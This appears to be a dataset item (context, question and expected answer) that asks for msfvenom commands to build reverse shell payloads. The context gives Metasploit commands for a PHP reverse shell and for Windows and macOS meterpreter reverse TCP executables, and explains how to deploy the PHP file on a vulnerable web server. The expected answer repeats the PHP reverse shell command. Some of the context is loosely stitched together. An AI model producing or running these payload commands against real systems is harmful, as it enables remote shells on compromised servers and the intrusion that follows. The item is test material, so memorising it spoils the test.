Context:```bash
msfvenom -p php/reverse_php LHOST=<attacker-ip> LPORT=<attacker-port> -f raw > reverse_shell.php
This command generates a raw PHP reverse shell payload using msfvenom. By specifying the local host (LHOST) and local port (LPORT) where the attacker is listening, this payload will create a reverse connection back to the attacker's machine. The generated shell will be saved in a file named reverse_shell.php, which can be deployed on a vulnerable web server to establish a shell session with the attacker.
php shell_http.php
`

`
use windows/x64/meterpreter_reverse_tcp
generate -f exe -o shell.exe MeterpreterDebugBuild=true MeterpreterDebugLogging='rpath:C:/Windows/Temp/foo.txt'

to_handler
`

`
use osx/x64/meterpreter_reverse_tcp
generate -f macho -o shell MeterpreterDebugbuild=true MeterpreterDebugLogging='rpath:/tmp/foo.txt'

to_handler
`

 Question: Provide Bash command using msfvenom to generate reverse TCP PHP payloads, targeting web servers. Ensure  command generate a .php payload, specifying LHOST and LPORT. Provide only the msfvenom command, with no additional text or explanations. 

 Your response: 
```bash
msfvenom -p php/reverse_php LHOST=<attacker-ip> LPORT=<attacker-port> -f raw > reverse_shell.php
```